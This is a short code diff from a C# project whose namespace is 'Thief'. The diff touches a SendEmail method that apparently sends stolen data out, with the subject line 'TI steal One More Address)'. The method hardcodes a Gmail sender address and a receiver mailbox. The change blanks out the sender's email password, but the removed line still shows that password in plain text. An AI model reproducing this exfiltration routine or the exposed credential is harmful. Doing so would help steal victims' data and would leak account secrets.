@@ -29,7 +29,7 @@ namespace Thief
         static async Task SendEmail(string message)
         {
             string emailSender = "coffetimetest@gmail.com";
-            string emailPassword = "felfgptbbcuccbzx";
+            string emailPassword = "";
             string emailReceiver = "arminttwat@gmail.com";
 
             string subject = "TI steal One More Address)";
